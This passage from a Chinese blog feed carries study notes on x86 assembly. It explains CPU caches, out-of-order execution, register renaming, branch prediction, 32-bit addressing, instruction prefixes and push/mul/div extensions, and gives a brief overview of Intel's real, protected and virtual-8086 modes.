title="高速缓存"></a>高速缓存</h2><p>因为需要等待内存和硬盘这样的慢速设备，处理器便无法全速运行。为缓解这一矛盾，高速缓存应运而生。高速缓存是处理器和内存之间的一个静态存储器，容量较小，但速度可以与处理器匹配</p><p>程序运行时的<strong>局部性原理</strong>：程序常常访问最近刚刚访问过的指令和数据，或者与它们相邻的指令和数据</p><p>利用程序运行时的局部性原理，可以把处理器正在访问和即将访问的指令和数据块从内存调入高速缓存中。当处理器要访问内存时，首先检索高速缓存，若要访问的内容已在高速缓存中，那么可以用极快的速度直接从高速缓存中取得，称为<strong>命中</strong>；否则，称为<strong>不中</strong>。在不中的情况下，处理器在取得需要的内容之前必须重新装载高速缓存，而不只是直接到内存中取得所需要的内容</p><p>高速缓存的转载以块为单位，包括装载所需数据的邻近内容。为此，需要额外的时间来等待块从内存载入高速缓存，在该过程中损失的时间称为<strong>不中惩罚</strong></p><p>在一些复杂的处理器内部，会存在多级高速缓存，分别应用于各个独立的执行部件</p><h2 id="乱序执行"><a href="#乱序执行" class="headerlink" title="乱序执行"></a>乱序执行</h2><p>为实现流水线技术，需要将指令拆分为更小的可独立执行部分，即拆分成<strong>微操作</strong></p><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add [mem],eax</span><br></pre></td></tr></table></figure><p>可拆分为三个微操作，一个从内存中读数据，一个执行相加动作，一个用于将相加的结果写回内存中</p><p>一旦将指令拆分为微操作，处理器就可以在必要的时候乱序执行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[mem1]</span><br><span class="line">shl eax,5</span><br><span class="line">add eax,[mem2]</span><br><span class="line">mov [mem3],eax</span><br></pre></td></tr></table></figure><p>指令<code>add eax,[mem2]</code>可以拆分为两个微操作。在执行逻辑左移指令的同时，处理器可以提前从内存中读取<code>mem2</code>的内容。典型的，若数据不在高速缓存中(不中)时，那么处理器在获取<code>mem1</code>的内容后，会立即开始获取<code>mem2</code>的内容，与此同时，<code>shl</code>指令的执行早就开始了</p><h2 id="寄存器重命名"><a href="#寄存器重命名" class="headerlink" title="寄存器重命名"></a>寄存器重命名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[mem1]</span><br><span class="line">shl eax,3</span><br><span class="line">mov [mem2],eax</span><br><span class="line">mov eax,[mem3]</span><br><span class="line">add eax,2</span><br><span class="line">mov [mem4],eax</span><br></pre></td></tr></table></figure><p>上述代码中，前三条与后三条进行了两件互不相关的事。但是在代码中使用了相同的寄存器。此时，处理器为最后三条指令使用了另一个不同的临时寄存器，用于左移指令和加法指令可以并行处理</p><p><strong><code>IA-32</code>架构的处理器只有8个32位的通用寄存器。不过，在处理器的内部，却有大量的临时寄存器可用，处理器可以重命名这些寄存器以代表一个逻辑寄存器</strong></p><p>寄存器重命名以一种完全自动和非常简单的方式工作。每当指令写逻辑寄存器时，处理器就为那个逻辑寄存器分配一个新的临时寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,[mem1]</span><br><span class="line">mov ebx,[mem2]</span><br><span class="line">add ebx,eax</span><br><span class="line">shl eax,3</span><br><span class="line">mov [mem3],eax</span><br><span class="line">mov [mem4],ebx</span><br></pre></td></tr></table></figure><p>若<code>mem1</code>的内容在高速缓存中，可立即取得。<code>mem2</code>内容不在高速缓存中。此时，逻辑左移操作可以在加法指令之前开始(使用临时寄存器代替<code>EAX</code>)。</p><p>将<code>mem1</code>的内容写入<code>eax</code>后，<code>mem2</code>的内容需要从内存读取，此时，使用临时寄存器存储逻辑左移指令的结果，<code>eax</code>中仍然只是存储<code>mem1</code>的内容，用于使用<code>eax</code>执行完加法指令</p><p>若没有寄存器重命名机制，逻辑左移操作将不得不等待从内存中读取<code>mem2</code>的内容到<code>ebx</code>寄存器并进行完加法操作之后才得以执行</p><p>在所有操作完成后，那个临时寄存器中存储的<code>eax</code>寄存器的最终结果才被写入真实的<code>eax</code>寄存器，该过程称为<strong>引退</strong></p><p>所有的通用寄存器，堆栈指针、标志、浮点寄存器，甚至段寄存器都有可能被重命名</p><h2 id="分支目标预测"><a href="#分支目标预测" class="headerlink" title="分支目标预测"></a>分支目标预测</h2><p>流水线并不是百分之百完美的解决方案。事实上，有很多潜在的因素会使得流水线不能达到最佳效率。典型的情况，若遇到一条转移指令，则后面那些已经进入到流水线的指令就都无效了。即，必须清空流水线，从要转移的目标位置处重新取指令放入流水线</p><p>在现代处理器中，流水线操作分为很多步骤，包括取指令、译码、寄存器分配和重命名、微操作排序、执行和引退。指令的流水线处理方式允许处理器同时做很多事情</p><p>流水线的最大问题是代码中经常存在分支，流水线越长，处理器在用错误的分支填充流水线时，浪费的时间越多</p><p>为解决这个问题，在<code>Pentium Pro</code>处理器上，引入<strong>分支预测技术</strong>。分支预测的核心问题是：转移是发生还是不会发生，或条件转移指令的条件会不会成立</p><p>从统计学的角度来看，有些事情一旦出现，下一次还会出现的概率较大。一个典型的案例就是循环，当循环执行一次后，下一次还会执行，而不是顺序向下执行，事实上，这个预测通常是很准的</p><p>在处理器内部，有一个小容量的高速缓存器，叫做<strong>分支目标缓存器</strong>(<code>BTB</code>)，当处理器执行了一条分支语句后，它会在<code>BTB</code>中记录当前指令的地址、分支目标的地址，以及本次分支预测的结果。下一次，在那条转移指令实际执行前，处理器会查找<code>BTB</code>，看有没有最近的转移记录。若可以找到对应的条目，则推测执行和上一次相同的分支，把该分支的指令送入流水线</p><p>当该指令实际执行时，若预测是失败的，那么，清空流水线，同时刷新<code>BTB</code>中的记录。代价较大</p><hr><h1 id="32位模式的指令系统"><a href="#32位模式的指令系统" class="headerlink" title="32位模式的指令系统"></a>32位模式的指令系统</h1><h2 id="32位处理器的寻址方式"><a href="#32位处理器的寻址方式" class="headerlink" title="32位处理器的寻址方式"></a>32位处理器的寻址方式</h2><p>在16位处理器上，指令中的操作数可以是8位或者16位的寄存器、指向8位或者16位实际操作数的16位内存地址，以及8位或16位的立即数</p><p>16位处理器，使用基址寄存器同变址寄存器，再加上8位或16位偏移量来寻址内存操作数</p><p>32位处理器兼容16位处理器的工作模式，可以运行传统的16位代码，但是，它有自己独立的32位运行模式</p><p>在32位模式下，默认使用32位宽度的寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,ebx</span><br></pre></td></tr></table></figure><p>若指令中使用了立即数，那么，默认该数值也是32位的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,55h;ECX&lt;-00000055</span><br></pre></td></tr></table></figure><p>若指令中的操作数是指向内存单元的地址，那么，该地址默认是32位的段内偏移地址，或称做段内偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx,[mem];mem是一个32位的段内偏移地址</span><br></pre></td></tr></table></figure><p><strong>32位处理器的寻址方式可以使用全部的32位通用寄存器作为基址寄存器。同时，还可以再加上一个除<code>ESP</code>之外的32位通用寄存器作为变址寄存器。变址寄存器允许乘以1、2、4或8作为比例因子。最后，还允许加上一个8位或32位的偏移量</strong></p><p><img src="/images/x86huibianyuyan/10/14.png" alt="14.png"></p><h2 id="操作数大小的指令前缀"><a href="#操作数大小的指令前缀" class="headerlink" title="操作数大小的指令前缀"></a>操作数大小的指令前缀</h2><p>每一条处理器指令都可以拥有前缀，例重复前缀(<code>REP</code>/<code>REPE</code>/<code>REPNE</code>)、段超越前缀(<code>ES:</code>)、总线封锁前缀(<code>LOCK</code>)等</p><p>前缀是可选的，每个前缀的长度是1字节，每条指令可以拥有1–4个前缀，或者不使用前缀</p><p>前缀(如果有的话)的后面是操作码部分。操作码的长度是1–3字节。操作码可以表示指令执行什么操作，同时，操作码还可以指示操作的字长，即数据宽度为字节还是字</p><p>操作码之后是操作数类型和寻址方式部分。此部分可选。简单指令不包含此部分，此部分也可以有1–2字节。这部分给出了指令的寻址方式，以及寄存器的类型</p><p>指令的最后是立即数和偏移量，可以是1、2或4字节</p><p><img src="/images/x86huibianyuyan/10/15.png" alt="15.png"></p><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov dx,[bx+si+02h]</span><br></pre></td></tr></table></figure><p><img src="/images/x86huibianyuyan/10/16.png" alt="16.png"></p><p><img src="/images/x86huibianyuyan/10/17.png" alt="17.png"></p><p>在16位指令编码格式中，内存单元到寄存器的传送指令使用操作码<code>8BH</code>，在<code>8BH</code>之后是1字节的寻址方式和操作数类型部分。第7位和第6位是01，表示使用了基地址变址的寻址方式，且带有8位偏移量；第5–3位为010，指示目的操作数为寄存器<code>DX</code>；位2–0位为000，表示寻址方式为<code>BX+SI+8位偏移量</code>。在该字节之后，是1字节的偏移量<code>02h</code>。因此，这条指令编译后的机器代码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8B 50 02</span><br></pre></td></tr></table></figure><p>32位处理器使用相同的编码格式，但寻址方式和寄存器的定义不同于16位指令。在32位处理器上，第7位和第6位的值是01，表示使用基址寻址方式，且带有8位偏移量；第5–3位为010，指示目的操作数为寄存器<code>EDX</code>；第2–0位为000，表示寻址方式为<code>EAX+8位偏移量</code>。在该字节之后，是1字节的偏移量<code>02h</code>。因此，同样的机器指令码，却对应不同的32位指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx,[eax+02h]</span><br></pre></td></tr></table></figure><p>即，<strong>相同的机器指令，在16位模式下和32位模式下的解释和执行效果是不同的</strong></p><p>32位处理器可以执行16位的程序。为此，在16位模式下，处理器将所有的指令都看作16位的。</p><p>机器指令吗<code>40h</code>在16位模式下的含义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc ax</span><br></pre></td></tr></table></figure><p>当处理器在16位模式下运行时，也可以使用32位的寄存器，执行32位的运算。为此，必须使用指令前缀<code>66h</code>来临时改变这种默认状态。因此，当处理器在16位模式下运行时，机器指令码<code>66 40</code>对应的指令不再是<code>inc ax</code>，而是<code>inc eax</code>(16位模式下执行32位指令)</p><p>相反的，若处理器运行在32位模式下，处理器默认指令的操作数为32位的，若添加<code>66h</code>指令前缀，用于指示指令是16位的(32位模式执行16位指令)</p><p>即，<strong>指令前缀<code>66h</code>具有反转当前默认操作数大小的作用</strong></p><p>在编写程序的时候，就应考虑到指令的运行环境。为指明程序的默认运行环境，<strong>编译器提供伪指令<code>bits</code>，用于指明其后的指令应该被编译成16位还是32位的</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bits 16;可写作[bits 16]</span><br><span class="line">mov cx,dx;89 D1</span><br><span class="line">mov eax,ebx;66 89 D8添加66h指令前缀，表示此指令虽使用32位寄存器，但为16位指令</span><br><span class="line"></span><br><span class="line">bits 32;可写作[bits 32]</span><br><span class="line">mov cx,dx;66 89 D1添加66h指令前缀，表示此指令虽使用16位寄存器，但为32位指令</span><br><span class="line">mov eax,ebx;89 D8</span><br></pre></td></tr></table></figure><p><strong>16位模式是默认的编译模式，若为指定指令的编译模式，则默认是<code>bits 16</code>的</strong></p><h2 id="一般指令的扩展"><a href="#一般指令的扩展" class="headerlink" title="一般指令的扩展"></a>一般指令的扩展</h2><p>32位的处理器都拥有32位的寄存器和算术逻辑部件，而且同内存芯片之间的数据通路至少是32位的，因此，所有以寄存器或者内存单元为操作数的指令都被扩充，以适应32位的算术逻辑操作。而且，这些扩展的操作即使是在16位模式下（实模式和16位保护模式）也是可用的</p><ol><li><p>双操作数指令、单操作数指令允许32位操作数</p></li><li><p>逻辑移动指令，如<code>shl</code>、<code>shr</code>等，目的操作数也扩展至32位</p><p> 和16位处理器相同，在32位处理器上，逻辑移动指令的源操作数如果是寄存器的话，则依然必须使用<code>CL</code>。同时，32位处理器在实际执行时，要先将源操作数（在<code>CL</code>寄存器内）同<code>1FH</code>做逻辑与。也就是说，仅保留源操作数的低5位，因此，实际移动的次数最大为31</p></li><li><p>在16位处理器上，<code>loop</code>指令的循环次数在寄存器<code>CX</code>中。在32位处理器上，如果当前的运行模式是 16 位的，那么，<code>loop</code>指令执行时，依然使用<code>CX</code>寄存器；否则，如果运行在32位模式下，则使用的是<code>ECX</code>寄存器</p></li><li><p>16位处理器中，无符号数乘法指令<code>mul</code>格式为：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mul r/m8;AX ← AL×r/m8 </span><br><span class="line">mul r/m16;DX:AX ← AX×r/m16</span><br></pre></td></tr></table></figure><p> 32位处理器中，除了上述支持外，还支持以下扩展</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mul r/m32;EDX:EAX ← EAX×r/m32</span><br></pre></td></tr></table></figure><p> 有符号数乘法指令<code>imul</code>与此相同</p></li><li><p>无符号数和有符号数除法也做了32位扩展</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div r/m32 </span><br><span class="line">idiv r/m32</span><br></pre></td></tr></table></figure><p> 被除数是64位的，高32位在<code>EDX</code>寄存器；低32位在<code>EAX</code>寄存器。除数是32位的，位于32位的寄存器或内存单元。指令执行后，32位的商在<code>EAX</code>寄存器,32位的余数在<code>EDX</code>寄存器</p></li><li><p>32位处理器的堆栈操作指令<code>push</code>和<code>pop</code>也有所扩展，允许压入双字操作数</p><ol><li><p>特别是，现在支持立即数压栈操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push imm8        ;操作码为 6A </span><br><span class="line">push imm16       ;操作码为 68 </span><br><span class="line">push imm32       ;操作码为 68</span><br></pre></td></tr></table></figure></li><li><p>例：压入字节数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push byte 55h</span><br></pre></td></tr></table></figure><p><code>byte</code>仅仅是给编译器用的，告诉编译器，压入的是字节，而不是用来在编译后的机器指令前添加指令前缀</p><p>这条指令的16位形式和32位形式是一样的，机器 代码都是<code>6A 55</code></p><p>但是，当它执行时，就不同了。注意，<strong>无论在什么时候，处理器都不会真的压入一字节，要么压入字，要么压入双字</strong></p><p>在16位模式下，默认的操作数字长是16，处理器在执行时，将该字节的符号位扩展高8位，然后压入堆栈，压栈时使用<code>SP</code>寄存器，且先将<code>SP</code>的内容减去2。这就是说，实际压入堆栈中的数值是<code>0055h</code></p><p>在32位模式下，压入的内容是该字节操作数符号位扩展高24位的结果，即 <code>00000055h</code>。压栈时使用<code>ESP</code>寄存器，且先将<code>ESP</code>的内容减去4。</p></li><li><p>如果压入的是字操作数，则必须用关键字<code>word</code>来修饰</p><p>例：压入字数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push word fffbh</span><br></pre></td></tr></table></figure><p>在16位模式下，默认的操作数字长是16，处理器在执行时，直接压入该字，压栈时使用<code>SP</code>寄存器，且先将<code>SP</code>的内容减去2</p><p>在 32 位模式下，压入的内容是该操作数符号位扩展高16位的结果，即<code>FFFFFFFBH</code>，压栈时使用<code>ESP</code>寄存器，且先将<code>ESP</code>的内容减去4</p></li><li><p>如果压入的是双字操作数，则必须用关键字<code>dword</code>来修饰</p><p>例：压入双字数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push dword fbh</span><br></pre></td></tr></table></figure><p>无论是在16位模式下，还是在32位模式下，压入的都是<code>000000FBH</code>，而且堆栈指针寄存器（<code>SP</code>或者<code>ESP</code>）都先减去4</p></li><li><p>对于实际操作数位于通用寄存器，或者位于内存单元的情况，只能压入字或者双字</p><p>指令格式为： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push r/m16 </span><br><span class="line">push r/m32</span><br></pre></td></tr></table></figure><p>如果是寄存器，则可以使用16位或者32位的通用寄存器</p><p>如果被压入的16位或者32位操作数位于内存单元中，则必须用关键字<code>word</code>或者<code>dword</code>修饰，以指示操作数的大小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push word [0x2000] </span><br><span class="line">push dword [ecx+esi*2+0x02]</span><br></pre></td></tr></table></figure><p>无论被压入的数位于寄存器，还是位于内存单元，在16位模式下，如果压入的是字操作数，那么 先将<code>SP</code>的内容减去2；如果压入的是双字，应当先将<code>SP</code>的内容减去4</p><p>在32位模式下，如果压入的是字操作数，那么先将<code>ESP</code>的内容减去2；如果压入的是双字，应当先将<code>ESP</code>的内容减去4 </p></li><li><p>段寄存器压入栈</p><p>格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push cs           ;机器指令为 0E</span><br><span class="line">push ds           ;机器指令为 1E</span><br><span class="line">push es           ;机器指令为 06 </span><br><span class="line">push fs           ;机器指令为 0F A0</span><br><span class="line">push gs           ;机器指令为 0F A8</span><br><span class="line">push ss           ;机器指令为 16</span><br></pre></td></tr></table></figure><p>在16位模式下，先将<code>SP</code>的内容减去2，然后直接压入段寄存器的内容</p><p>在32位模式下，要先将段寄存器的内容用零扩展到32位，即高16位为全零。然后，将<code>ESP</code>的内容减去4，再压入扩展后的32位值</p></li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="汇编与逆向" scheme="http://yoursite.com/categories/%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91/"/>
    
    
      <category term="x86汇编语言" scheme="http://yoursite.com/tags/x86%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>汇编语言(王爽)-Intel系列微处理器的3种工作模式</title>
    <link href="http://yoursite.com/2019/04/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-Intel%E7%B3%BB%E5%88%97%E5%BE%AE%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%843%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <id>http://yoursite.com/2019/04/30/汇编语言-王爽-Intel系列微处理器的3种工作模式/</id>
    <published>2019-04-30T09:43:00.000Z</published>
    <updated>2019-05-01T07:31:12.095Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>微机中常用的<code>Intel</code>系列微处理器的主要发展过程：8080、8086/8088、80186、80286、80386、80486、<code>Pentium</code>、<code>Pentium II</code>、<code>Pentium III</code>、<code>Pentium4</code></p><p>8086/8088不具备实现一个完善的多任务操作系统的功能</p><p>80286具备了对多任务系统的支持，但无法对8086/8088进行兼容，妨碍了用户对原8086机上的程序的使用</p><p><code>Intel</code>开发了80386微处理器，它可以在以下3个模式下工作：</p><ol><li><p>实模式：工作方式相当于一个8086</p></li><li><p>保护模式：提供支持多任务环境的工作方式，建立保护机制(与<code>VAX</code>等小型机类似)</p></li><li><p>虚拟8086模式：可从保护模式切换至其中的一种8086工作方式。这种方式使用户可以方便的在保护模式下运行一个或多个原8086程序</p></li></ol><p>以后的各代微处理器都提供了上述3种工作模式</p><p>任何一台使用<code>Intel</code>系列<code>CPU</code>的<code>PC</code>机只要一开机，<code>CPU</code>就工作在实模式下</p><p>若安装<code>DOS</code>操作系统，那么在<code>DOS</code>加载后<code>CPU</code>仍以实模式工作</p><p>若安装<code>Windows</code>操作系统，那么<code>Windows</code>加载后，将由<code>Windows</code>将<code>CPU</code>切换到保护模式下工作，因<code>Windows</code>是多任务系统，它必须在保护模式下运行</p><p>若在<code>Windows</code>种运行一个<code>DOS</code>下的程序，或者点击开始菜单在程序项中进入<code>MS-DOS</code>方式。那么<code>Windows</code>将<code>CPU</code>切换到虚拟8086模式下运行该程序</p><p>可以从保护模式直接进入能运行原8086程序的虚拟8086模式是很有意义的，为用户提供了可以在现有的多任务系统中方便的运行原8086系统中的程序的一种机制</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="汇编与逆向" scheme="http://yoursite.com/categories/%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91/"/>
    
    
      <category term="8086汇编语言" scheme="http://yoursite.com/tags/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
</feed>
